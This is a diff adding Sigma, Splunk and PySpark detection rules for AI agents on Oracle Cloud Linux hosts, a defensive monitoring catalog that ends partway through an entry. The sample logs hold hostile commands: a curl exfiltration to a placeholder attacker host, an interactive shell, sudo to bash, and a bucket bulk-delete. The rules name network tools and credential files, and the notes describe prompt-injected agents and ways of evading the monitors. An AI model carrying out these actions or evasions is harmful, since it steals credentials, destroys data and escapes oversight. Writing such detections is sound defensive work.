@@ -903,6 +903,861 @@ detections = with_baseline.filter(col("z_score") > 2.5)`,
     problemStatement:
       "In OCI, compartments are the primary isolation boundary. A user unexpectedly accessing compartments outside their normal scope may indicate privilege escalation, credential compromise, or policy misconfiguration exploitation.",
   },
+
+  // ── AI Agent Detections (from OCI Linux Agentic AI Sigma Bundle) ──────────
+
+  {
+    id: "asi01-001",
+    title: "AI Agent Spawning Shell Interpreter",
+    description:
+      "Detects AI agent runtimes (Python, Node) spawning interactive shell interpreters — a strong indicator of agent goal hijacking, prompt injection leading to code execution, or unsafe tool invocation.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1059.004"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "agent-hijack", "shell-execution", "linux", "oci"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Spawning Shell Interpreter
+id: asi01-oci-linux-001
+"owasp top 10": "ASI01 Agent Goal Hijack"
+status: experimental
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_parent:
+    ParentImage|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+      - '/java'
+      - '/usr/local/bin/python'
+  selection_child:
+    Image|endswith:
+      - '/bin/bash'
+      - '/bin/sh'
+      - '/bin/zsh'
+      - '/usr/bin/fish'
+  condition: selection_parent and selection_child
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - ParentCommandLine
+  - User
+  - ComputerName
+level: high
+tags:
+  - attack.execution
+  - ai.agent
+  - owasp.asi01
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_process
+  parent_image IN ("*/python", "*/python3", "*/node", "*/java")
+  image IN ("*/bin/bash", "*/bin/sh", "*/bin/zsh", "*/usr/bin/fish")
+| table _time, computer_name, user, image, command_line, parent_image, parent_command_line
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, command_line, parent_image,
+           'asi01-oci-linux-001' AS detection_id,
+           'AI Agent Spawning Shell Interpreter' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (parent_image LIKE '%/python'
+           OR parent_image LIKE '%/python3'
+           OR parent_image LIKE '%/node'
+           OR parent_image LIKE '%/java')
+      AND (image LIKE '%/bin/bash'
+           OR image LIKE '%/bin/sh'
+           OR image LIKE '%/bin/zsh'
+           OR image LIKE '%/usr/bin/fish')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T14:22:01Z","computer_name":"oci-worker-01","user":"agent_svc","image":"/bin/bash","command_line":"bash -i","parent_image":"/usr/bin/python3","parent_command_line":"python3 /opt/agent/run.py"}`,
+    ],
+    requiredFields: ["image", "parent_image", "command_line", "user", "computer_name"],
+    falsePositives: [
+      "Legitimate automation scripts that spawn shells for system administration",
+      "Build systems or CI/CD pipelines using Python to orchestrate shell tasks",
+    ],
+    tuningGuidance:
+      "Whitelist known CI/CD service accounts and approved automation pipelines. Focus on interactive sessions (TTY-attached shells) to reduce false positives from batch automation.",
+    deploymentNotes:
+      "Requires Linux process creation auditing via auditd or eBPF-based telemetry with parent process tracking enabled. Ensure ParentImage field is populated.",
+    evasionConsiderations:
+      "Attackers may use exec() calls within Python rather than spawning child processes, or use less-monitored interpreters like dash or busybox sh.",
+    problemStatement:
+      "AI agents running on Linux (Python/Node runtimes) should not spawn interactive shells under normal operation. Shell spawning from agent processes indicates goal hijacking, prompt injection, or unsafe code execution.",
+  },
+  {
+    id: "asi01-002",
+    title: "AI Agent Connecting to Non-OCI External Destination",
+    description:
+      "Detects AI agent processes making outbound network connections to external, non-private destinations outside the OCI network — indicating potential data exfiltration, C2 communication, or unauthorized external API usage.",
+    platform: ["Linux", "OCI", "Network"],
+    mitre: ["T1041", "T1071"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "medium",
+    tags: ["AI Security", "Agentic AI", "exfiltration", "c2", "network", "oci"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Connecting To Non OCI External Destination
+id: asi01-oci-linux-002
+"owasp top 10": "ASI01 Agent Goal Hijack"
+status: experimental
+logsource:
+  product: linux
+  category: network_connection
+detection:
+  selection_proc:
+    Image|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+      - '/java'
+  filter_oci:
+    DestinationHostname|endswith:
+      - '.oraclecloud.com'
+      - '.oci.oraclecloud.com'
+      - '.oracle.com'
+  filter_private:
+    DestinationIp|cidr:
+      - 10.0.0.0/8
+      - 172.16.0.0/12
+      - 192.168.0.0/16
+      - 127.0.0.0/8
+  condition: selection_proc and not 1 of filter_*
+fields:
+  - Image
+  - CommandLine
+  - DestinationIp
+  - DestinationHostname
+  - DestinationPort
+  - User
+  - ComputerName
+level: medium
+tags:
+  - attack.command-and-control
+  - ai.agent
+  - owasp.asi01
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_network sourcetype=linux_network_conn
+  image IN ("*/python", "*/python3", "*/node", "*/java")
+  NOT destination_hostname IN ("*.oraclecloud.com", "*.oracle.com")
+  NOT destination_ip IN ("10.*", "172.16.*", "192.168.*", "127.*")
+| table _time, computer_name, user, image, destination_ip, destination_hostname, destination_port
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, destination_ip, destination_hostname, destination_port,
+           'asi01-oci-linux-002' AS detection_id,
+           'AI Agent External Network Connection' AS detection_name,
+           'medium' AS severity
+    FROM linux_audit_events
+    WHERE (image LIKE '%/python'
+           OR image LIKE '%/python3'
+           OR image LIKE '%/node'
+           OR image LIKE '%/java')
+      AND destination_hostname NOT LIKE '%.oraclecloud.com'
+      AND destination_hostname NOT LIKE '%.oracle.com'
+      AND destination_ip NOT LIKE '10.%'
+      AND destination_ip NOT LIKE '172.16.%'
+      AND destination_ip NOT LIKE '192.168.%'
+      AND destination_ip != '127.0.0.1'
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T15:03:12Z","computer_name":"oci-agent-02","user":"llm_agent","image":"/usr/bin/python3","destination_ip":"45.33.32.156","destination_hostname":"scanme.nmap.org","destination_port":443}`,
+    ],
+    requiredFields: ["image", "destination_ip", "destination_hostname", "destination_port", "user"],
+    falsePositives: [
+      "AI agents legitimately calling approved external LLM APIs (OpenAI, Anthropic, etc.)",
+      "Package managers updating dependencies",
+    ],
+    tuningGuidance:
+      "Maintain an allowlist of approved external endpoints for each agent deployment. Alert on connections outside the allowlist rather than using a broad blocklist.",
+    deploymentNotes:
+      "Requires network flow telemetry with process attribution. Linux auditd syscall auditing with connect() and sendto() rules, or eBPF-based network monitoring with process context.",
+    evasionConsiderations:
+      "Exfiltration may occur through DNS tunneling, HTTPS to allowed domains used as proxies, or via other processes spawned by the agent.",
+    problemStatement:
+      "AI agents deployed in OCI should have controlled, documented egress. Uncontrolled external connections from agent runtimes indicate unauthorized API usage, data exfiltration, or C2 communication resulting from goal hijacking or prompt injection.",
+  },
+  {
+    id: "asi01-003",
+    title: "AI Agent Accessing OCI CLI Config or API Keys",
+    description:
+      "Detects AI agent runtimes reading OCI CLI configuration files or API key material — a strong indicator of credential harvesting for privilege escalation or unauthorized API access.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1552.001", "T1083"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "credential-access", "oci", "api-keys"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Accessing OCI CLI Config Or API Keys
+id: asi01-oci-linux-003
+"owasp top 10": "ASI01 Agent Goal Hijack"
+status: experimental
+logsource:
+  product: linux
+  category: file_access
+detection:
+  selection_proc:
+    Image|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_file:
+    TargetFilename|contains:
+      - '/.oci/config'
+      - '/.oci/oci_api_key.pem'
+      - '/.oci/'
+  condition: selection_proc and selection_file
+fields:
+  - Image
+  - User
+  - TargetFilename
+  - ComputerName
+level: high
+tags:
+  - attack.credential-access
+  - ai.agent
+  - owasp.asi01
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_file
+  image IN ("*/python", "*/python3", "*/node")
+  target_filename IN ("*/.oci/config", "*/.oci/oci_api_key.pem", "*/.oci/*")
+| table _time, computer_name, user, image, target_filename
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, target_filename,
+           'asi01-oci-linux-003' AS detection_id,
+           'AI Agent Accessing OCI API Keys' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (image LIKE '%/python'
+           OR image LIKE '%/python3'
+           OR image LIKE '%/node')
+      AND (target_filename LIKE '%/.oci/config'
+           OR target_filename LIKE '%/.oci/oci_api_key.pem'
+           OR target_filename LIKE '%/.oci/%')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T16:11:04Z","computer_name":"oci-worker-01","user":"agent_svc","image":"/usr/bin/python3","target_filename":"/home/agent_svc/.oci/config","operation":"open","flags":"O_RDONLY"}`,
+    ],
+    requiredFields: ["image", "target_filename", "user", "computer_name"],
+    falsePositives: [
+      "Legitimate agent code using OCI SDK with explicitly configured credentials path",
+      "Infrastructure automation scripts using OCI CLI",
+    ],
+    tuningGuidance:
+      "Whitelist agent service accounts that are explicitly authorized to use OCI SDK credentials. Alert on human user accounts or unexpected service accounts accessing OCI key material.",
+    deploymentNotes:
+      "Requires auditd file access auditing with -a always,exit -F arch=b64 -S open,openat rules targeting ~/.oci/ paths. Ensure process attribution is available.",
+    evasionConsiderations:
+      "Agents may read credentials via environment variables or instance metadata endpoints rather than file access, bypassing file-based monitoring.",
+    problemStatement:
+      "OCI API keys and CLI config files contain credentials that allow full API access to cloud infrastructure. Agent access to these files outside of authorized operations indicates credential harvesting for privilege escalation.",
+  },
+  {
+    id: "asi02-001",
+    title: "AI Agent Spawning curl, wget, or netcat",
+    description:
+      "Detects AI agent processes spawning network utility tools (curl, wget, nc) — indicative of tool misuse for data exfiltration, downloading payloads, or establishing reverse shells.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1105", "T1059.004", "T1041"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "tool-misuse", "exfiltration", "linux"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Spawning Curl Wget Or Netcat
+id: asi02-oci-linux-001
+"owasp top 10": "ASI02 Tool Misuse"
+status: experimental
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_parent:
+    ParentImage|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_child:
+    Image|endswith:
+      - '/curl'
+      - '/wget'
+      - '/nc'
+      - '/ncat'
+      - '/scp'
+  condition: selection_parent and selection_child
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+  - ComputerName
+level: high
+tags:
+  - attack.execution
+  - ai.agent
+  - owasp.asi02
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_process
+  parent_image IN ("*/python", "*/python3", "*/node")
+  image IN ("*/curl", "*/wget", "*/nc", "*/ncat", "*/scp")
+| table _time, computer_name, user, image, command_line, parent_image
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, command_line, parent_image,
+           'asi02-oci-linux-001' AS detection_id,
+           'AI Agent Spawning Network Tool' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (parent_image LIKE '%/python'
+           OR parent_image LIKE '%/python3'
+           OR parent_image LIKE '%/node')
+      AND (image LIKE '%/curl'
+           OR image LIKE '%/wget'
+           OR image LIKE '%/nc'
+           OR image LIKE '%/ncat'
+           OR image LIKE '%/scp')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T17:05:33Z","computer_name":"oci-agent-01","user":"llm_agent","image":"/usr/bin/curl","command_line":"curl -X POST https://attacker.io/exfil -d @/tmp/data.json","parent_image":"/usr/bin/python3"}`,
+    ],
+    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
+    falsePositives: [
+      "Legitimate agent workflows that use curl/wget to call approved external APIs",
+      "Health check scripts spawned by agent orchestration code",
+    ],
+    tuningGuidance:
+      "Maintain an allowlist of approved tool invocations with expected argument patterns. Any invocation to unknown destinations or with atypical arguments should generate alerts.",
+    deploymentNotes:
+      "Requires process creation auditing with parent process tracking. Sysmon for Linux or auditd with PPID enrichment is required.",
+    evasionConsiderations:
+      "Exfiltration may use Python's built-in urllib/requests libraries rather than spawning child processes, or may use DNS tunneling tools not on the blocklist.",
+    problemStatement:
+      "Network transfer utilities spawned from AI agent runtimes can exfiltrate data, download malicious payloads, or establish reverse shells. This pattern is characteristic of tool misuse following successful prompt injection.",
+  },
+  {
+    id: "asi02-002",
+    title: "AI Agent Invoking OCI CLI with Destructive Verbs",
+    description:
+      "Detects AI agents invoking the OCI CLI with destructive operations (delete, terminate, bulk-delete) — indicating tool misuse where agent permissions are being weaponized for unauthorized infrastructure destruction.",
+    platform: ["Linux", "OCI", "Cloud"],
+    mitre: ["T1485", "T1531"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "tool-misuse", "oci", "impact", "destructive"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Invoking OCI CLI With Destructive Verbs
+id: asi02-oci-linux-002
+"owasp top 10": "ASI02 Tool Misuse"
+status: experimental
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_parent:
+    ParentImage|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_child:
+    Image|endswith:
+      - '/oci'
+  selection_cmd:
+    CommandLine|contains:
+      - ' delete '
+      - ' update '
+      - ' terminate '
+      - ' change-compartment '
+      - ' bulk-delete '
+  condition: selection_parent and selection_child and selection_cmd
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - ParentCommandLine
+  - User
+  - ComputerName
+level: high
+tags:
+  - attack.impact
+  - ai.agent
+  - owasp.asi02
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_process
+  parent_image IN ("*/python", "*/python3", "*/node")
+  image="*/oci"
+  (command_line="* delete *" OR command_line="* terminate *" OR command_line="* bulk-delete *")
+| table _time, computer_name, user, command_line, parent_image, parent_command_line
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, command_line, parent_image,
+           'asi02-oci-linux-002' AS detection_id,
+           'AI Agent OCI CLI Destructive Operation' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (parent_image LIKE '%/python'
+           OR parent_image LIKE '%/python3'
+           OR parent_image LIKE '%/node')
+      AND image LIKE '%/oci'
+      AND (LOWER(command_line) LIKE '% delete %'
+           OR LOWER(command_line) LIKE '% terminate %'
+           OR LOWER(command_line) LIKE '% bulk-delete %'
+           OR LOWER(command_line) LIKE '% change-compartment %')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T18:22:10Z","computer_name":"oci-worker-02","user":"agent_svc","image":"/usr/local/bin/oci","command_line":"oci os object bulk-delete --bucket-name sensitive-data --namespace mytenancy","parent_image":"/usr/bin/python3"}`,
+    ],
+    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
+    falsePositives: [
+      "Authorized infrastructure automation using OCI CLI for legitimate resource lifecycle management",
+      "Approved DevOps pipelines performing scheduled cleanup operations",
+    ],
+    tuningGuidance:
+      "Restrict OCI CLI usage from agent service accounts to read-only operations where possible. Any destructive CLI invocation from agent runtimes should require human approval or trigger an alert.",
+    deploymentNotes:
+      "Requires process creation auditing with full command line capture and parent process tracking. OCI CLI audit logs should also be correlated for comprehensive coverage.",
+    evasionConsiderations:
+      "Agent may invoke OCI SDK directly via Python/Node without spawning the OCI CLI process, bypassing this detection. Supplement with OCI Audit log monitoring for API-level destructive operations.",
+    problemStatement:
+      "AI agents with OCI CLI access can be manipulated via prompt injection or goal drift to execute destructive cloud operations. Detecting destructive CLI verbs from agent runtimes is critical for preventing infrastructure damage.",
+  },
+  {
+    id: "asi03-001",
+    title: "AI Agent Invoking sudo or su",
+    description:
+      "Detects AI agent runtimes attempting privilege escalation via sudo or su — indicating identity and privilege abuse where an agent is attempting to gain elevated OS-level access.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1548.003"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "privilege-escalation", "sudo", "linux"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Invoking Sudo Or Su
+id: asi03-oci-linux-003
+"owasp top 10": "ASI03 Identity & Privilege Abuse"
+status: experimental
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_parent:
+    ParentImage|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_child:
+    Image|endswith:
+      - '/sudo'
+      - '/su'
+  condition: selection_parent and selection_child
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+  - ComputerName
+level: high
+tags:
+  - attack.privilege-escalation
+  - ai.agent
+  - owasp.asi03
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_process
+  parent_image IN ("*/python", "*/python3", "*/node")
+  image IN ("*/sudo", "*/su")
+| table _time, computer_name, user, image, command_line, parent_image
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, command_line, parent_image,
+           'asi03-oci-linux-003' AS detection_id,
+           'AI Agent Privilege Escalation via sudo' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (parent_image LIKE '%/python'
+           OR parent_image LIKE '%/python3'
+           OR parent_image LIKE '%/node')
+      AND (image LIKE '%/sudo'
+           OR image LIKE '%/su')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T19:44:01Z","computer_name":"oci-agent-03","user":"llm_agent","image":"/usr/bin/sudo","command_line":"sudo /bin/bash","parent_image":"/usr/bin/python3"}`,
+    ],
+    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
+    falsePositives: [
+      "Intentionally privileged agent deployments that require elevated access for specific tasks",
+    ],
+    tuningGuidance:
+      "Agent service accounts should not have sudo privileges under normal operation. Any sudo invocation from an agent runtime is highly anomalous and should be treated as a high-priority alert.",
+    deploymentNotes:
+      "Requires process creation auditing with parent process tracking. Additionally enable sudo audit logging via the Defaults log_input, log_output options in /etc/sudoers.",
+    evasionConsiderations:
+      "Privilege escalation may be achieved through SUID binaries rather than sudo/su, or through kernel exploits. Monitor for SUID binary execution from agent runtimes as a complementary detection.",
+    problemStatement:
+      "AI agent runtimes should operate with least-privilege service accounts. Attempted privilege escalation via sudo/su from agent processes indicates either a security misconfiguration or an active attack leveraging agent capabilities for local privilege escalation.",
+  },
+  {
+    id: "asi03-002",
+    title: "AI Agent Reading SSH Private Keys",
+    description:
+      "Detects AI agent processes accessing SSH private key files — indicating credential theft that could be used for lateral movement to other systems.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1552.004"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "credential-access", "ssh", "lateral-movement"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Reading SSH Private Keys
+id: asi03-oci-linux-002
+"owasp top 10": "ASI03 Identity & Privilege Abuse"
+status: experimental
+logsource:
+  product: linux
+  category: file_access
+detection:
+  selection_proc:
+    Image|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_key:
+    TargetFilename|endswith:
+      - '/id_rsa'
+      - '/id_ed25519'
+      - '.pem'
+      - '.ppk'
+  condition: selection_proc and selection_key
+fields:
+  - Image
+  - TargetFilename
+  - User
+  - ComputerName
+level: high
+tags:
+  - attack.credential-access
+  - ai.agent
+  - owasp.asi03
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_file
+  image IN ("*/python", "*/python3", "*/node")
+  (target_filename="*/id_rsa" OR target_filename="*/id_ed25519" OR target_filename="*.pem" OR target_filename="*.ppk")
+| table _time, computer_name, user, image, target_filename
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, target_filename,
+           'asi03-oci-linux-002' AS detection_id,
+           'AI Agent Reading SSH Private Keys' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (image LIKE '%/python'
+           OR image LIKE '%/python3'
+           OR image LIKE '%/node')
+      AND (target_filename LIKE '%/id_rsa'
+           OR target_filename LIKE '%/id_ed25519'
+           OR target_filename LIKE '%.pem'
+           OR target_filename LIKE '%.ppk')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T20:15:22Z","computer_name":"oci-worker-01","user":"agent_svc","image":"/usr/bin/python3","target_filename":"/home/agent_svc/.ssh/id_rsa","operation":"open","flags":"O_RDONLY"}`,
+    ],
+    requiredFields: ["image", "target_filename", "user", "computer_name"],
+    falsePositives: [
+      "Agents explicitly designed to use SSH for file transfer (must be individually whitelisted)",
+    ],
+    tuningGuidance:
+      "SSH private key access from agent runtimes is almost universally anomalous. Any match should be treated as high priority. Whitelist only explicitly documented exceptions.",
+    deploymentNotes:
+      "Requires file access auditing with auditd rules for read operations on ~/.ssh/ and common PEM file paths.",
+    evasionConsiderations:
+      "Credentials may be extracted from environment variables or a secrets manager rather than direct file access, bypassing file-based monitoring.",
+    problemStatement:
+      "SSH private keys provide direct lateral movement capability. Agent access to SSH credentials outside of explicitly authorized operations indicates credential theft for use in attacking other systems in the environment.",
+  },
+  {
+    id: "asi04-001",
+    title: "AI Agent Installing Packages from Unapproved Sources",
+    description:
+      "Detects AI agent processes connecting to non-allowlisted package registry endpoints — indicating potential agentic supply chain compromise through installation of malicious packages.",
+    platform: ["Linux", "OCI", "Network"],
+    mitre: ["T1195.001", "T1072"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "medium",
+    tags: ["AI Security", "Agentic AI", "supply-chain", "package-install", "linux"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Installing Python Or Node Packages From Non Approved Repositories
+id: asi04-oci-linux-001
+"owasp top 10": "ASI04 Agentic Supply Chain Vulnerabilities"
+status: experimental
+logsource:
+  product: linux
+  category: network_connection
+detection:
+  selection_proc:
+    Image|endswith:
+      - '/pip'
+      - '/pip3'
+      - '/python'
+      - '/python3'
+      - '/npm'
+      - '/node'
+  filter_allowed:
+    DestinationHostname|endswith:
+      - 'pypi.org'
+      - 'files.pythonhosted.org'
+      - 'registry.npmjs.org'
+      - 'github.com'
+      - '.oraclecloud.com'
+      - '.oracle.com'
+  condition: selection_proc and not filter_allowed
+fields:
+  - Image
+  - DestinationHostname
+  - DestinationIp
+  - DestinationPort
+  - User
+  - ComputerName
+level: medium
+tags:
+  - attack.resource-development
+  - ai.agent
+  - owasp.asi04
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_network sourcetype=linux_network_conn
+  image IN ("*/pip", "*/pip3", "*/python", "*/python3", "*/npm", "*/node")
+  NOT destination_hostname IN ("*.pypi.org", "*.pythonhosted.org", "*.npmjs.org", "*.github.com", "*.oraclecloud.com", "*.oracle.com")
+| table _time, computer_name, user, image, destination_hostname, destination_ip, destination_port
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, destination_hostname, destination_ip, destination_port,
+           'asi04-oci-linux-001' AS detection_id,
+           'AI Agent Package Install from Unapproved Source' AS detection_name,
+           'medium' AS severity
+    FROM linux_audit_events
+    WHERE (image LIKE '%/pip'
+           OR image LIKE '%/pip3'
+           OR image LIKE '%/npm'
+           OR image LIKE '%/python'
+           OR image LIKE '%/python3'
+           OR image LIKE '%/node')
+      AND destination_hostname NOT LIKE '%.pypi.org'
+      AND destination_hostname NOT LIKE '%.pythonhosted.org'
+      AND destination_hostname NOT LIKE '%.npmjs.org'
+      AND destination_hostname NOT LIKE '%.github.com'
+      AND destination_hostname NOT LIKE '%.oraclecloud.com'
+      AND destination_hostname NOT LIKE '%.oracle.com'
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T21:02:44Z","computer_name":"oci-agent-02","user":"llm_agent","image":"/usr/bin/pip3","destination_hostname":"malicious-pypi-mirror.io","destination_ip":"192.0.2.100","destination_port":443}`,
+    ],
+    requiredFields: ["image", "destination_hostname", "destination_ip", "user", "computer_name"],
+    falsePositives: [
+      "Agents connecting to organization-internal package mirrors not in the allowlist",
+      "Private PyPI or npm registries hosted on custom domains",
+    ],
+    tuningGuidance:
+      "Expand the allowlist to include all approved internal and external package registries for your environment. Alert on anything outside the allowlist.",
+    deploymentNotes:
+      "Requires network connection logging with process attribution. eBPF-based tools (Falco, Tetragon) or auditd with network syscall auditing and process context enrichment.",
+    evasionConsiderations:
+      "Malicious packages may be hosted on allowed registries (typosquatting on PyPI/npm). Complement with package name scanning and hash verification.",
+    problemStatement:
+      "AI agents that can install packages from arbitrary sources are vulnerable to supply chain attacks. Malicious packages can backdoor the agent runtime, exfiltrate data, or provide persistent access to the underlying host.",
+  },
+  {
+    id: "asi05-001",
+    title: "AI Agent Executing from Temporary or Shared Memory Paths",
+    description:
+      "Detects AI agent runtimes spawning processes from temporary directories (/tmp, /dev/shm) — a strong indicator of dynamic code execution from attacker-controlled content, characteristic of unexpected code execution attacks.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1059.004", "T1036.005"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "high",
+    tags: ["AI Security", "Agentic AI", "code-execution", "tmp-execution", "linux"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Executing From Temporary Or Shared Memory Paths
+id: asi05-oci-linux-001
+"owasp top 10": "ASI05 Unexpected Code Execution"
+status: experimental
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_parent:
+    ParentImage|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_image:
+    Image|contains:
+      - '/tmp/'
+      - '/var/tmp/'
+      - '/dev/shm/'
+  condition: selection_parent and selection_image
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+  - ComputerName
+level: high
+tags:
+  - attack.execution
+  - ai.agent
+  - owasp.asi05
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_process
+  parent_image IN ("*/python", "*/python3", "*/node")
+  (image="*/tmp/*" OR image="*/var/tmp/*" OR image="*/dev/shm/*")
+| table _time, computer_name, user, image, command_line, parent_image
+| sort -_time`,
+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, command_line, parent_image,
+           'asi05-oci-linux-001' AS detection_id,
+           'AI Agent Executing from Temp Path' AS detection_name,
+           'high' AS severity
+    FROM linux_audit_events
+    WHERE (parent_image LIKE '%/python'
+           OR parent_image LIKE '%/python3'
+           OR parent_image LIKE '%/node')
+      AND (image LIKE '%/tmp/%'
+           OR image LIKE '%/var/tmp/%'
+           OR image LIKE '%/dev/shm/%')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T22:01:15Z","computer_name":"oci-worker-01","user":"agent_svc","image":"/tmp/exploit.sh","command_line":"/tmp/exploit.sh","parent_image":"/usr/bin/python3"}`,
+    ],
+    requiredFields: ["image", "parent_image", "command_line", "user", "computer_name"],
+    falsePositives: [
+      "Legitimate agent workflows that compile and execute code in temporary directories for sandboxed evaluation",
+    ],
+    tuningGuidance:
+      "Use noexec mount option on /tmp and /dev/shm to prevent execution from these paths at the OS level. Any remaining execution attempts should be treated as high priority.",
+    deploymentNotes:
+      "Requires process creation auditing with parent process tracking. The noexec mount option provides a complementary preventive control.",
+    evasionConsiderations:
+      "Attackers may use in-memory execution techniques that don't touch disk, or use memfd_create() to execute code without a filesystem path.",
+    problemStatement:
+      "Executing code from temporary or shared memory paths is a classic indicator of exploitation. AI agents executing content from these paths have been successfully manipulated into running attacker-controlled code through prompt injection or tool abuse.",
+  },
+  {
+    id: "asi06-001",
+    title: "AI Agent Modifying Prompt Template or System Instruction Files",
+    description:
+      "Detects AI agent runtimes writing to files with names suggestive of prompt templates, system instructions, or personas — indicating potential memory and context poisoning that could persist malicious instructions across agent sessions.",
+    platform: ["Linux", "OCI"],
+    mitre: ["T1565.001", "T1059"],
+    category: "AI Security",
+    maturity: "experimental",
+    severity: "medium",
+    tags: ["AI Security", "Agentic AI", "context-poisoning", "prompt-template", "persistence"],
+    author: "AI Security Team",
+    updated: "2025-01-10",
+    sigma: `title: Linux Agent Overwriting Prompt Template Or System Instruction Files
+id: asi06-oci-linux-002
+"owasp top 10": "ASI06 Memory & Context Poisoning"
+status: experimental
+logsource:
+  product: linux
+  category: file_event
+detection:
+  selection_proc:
+    Image|endswith:
+      - '/python'
+      - '/python3'
+      - '/node'
+  selection_target:
+    TargetFilename|contains:
+      - 'prompt'
+      - 'system_instruction'
+      - 'template'
+      - 'persona'
+  condition: selection_proc and selection_target
+fields:
+  - Image
+  - TargetFilename
+  - User
+  - ComputerName
+level: medium
+tags:
+  - attack.persistence
+  - ai.agent
+  - owasp.asi06
+  - cloud.oci
+  - product.linux`,
+    splunk: `index=linux_audit sourcetype=auditd_file
+  image IN ("*/python", "*/python3", "*/node")
+  (target_filename="*prompt*" OR target_filename="*system_instruction*" OR target_filename="*template*" OR target_filename="*persona*")
+| table _time, computer_name, user, image, target_filename
+| sort -_time`,
